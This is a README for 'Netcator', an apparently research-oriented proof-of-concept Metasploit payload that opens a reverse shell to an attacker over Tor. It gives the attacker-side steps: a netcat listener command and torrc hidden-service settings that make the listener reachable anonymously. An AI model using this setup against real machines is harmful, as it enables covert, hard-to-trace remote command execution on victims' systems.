Netcator
========
A simple PoC of a Linux payload that gets connected to a listening netcat via Tor and lets the attacker run commands in the target machine.

Installation
------------

Although this software is a PoC, this can be easily run as a local plugin by copying the ruby files in their corresponding metasploit data directory.

Scenario
--------

Assuming that the victim is already running Tor, to set the environment an attacker would have to:

* Install tor in the attacker machine. E. g., in Debian-like systems:
```
	sudo apt-get install tor
```

* Set up a listening netcat locally in the machine.
```
	nc -v -l -p 1234 127.0.0.1
```

* Configuring the listening netcat to be reachable via Tor by updating the torrc file:
```
	HiddenServiceDir /var/lib/tor/nc_hidden_service/
	HiddenServicePort 1234 127.0.0.1:1234
```

* Start the Tor service in the attacker's machine and get the hostname stored in the HiddenServiceDir set before:
```
	service tor start
```

* Prepare the payload accordingly.

Final Remarks
-------------

Note that the full scenario will imply the installation/compilation of Tor in the victim. 
Similar scenarios can be deployed using other services such as SSH or Meterpreter. More detailed information can be found in the [Eleven Paths](https://www.elevenpaths.com/es/nuevo-eleven-paths-discover-netcator-shell-inversa-a-traves-de-tor/index.html).
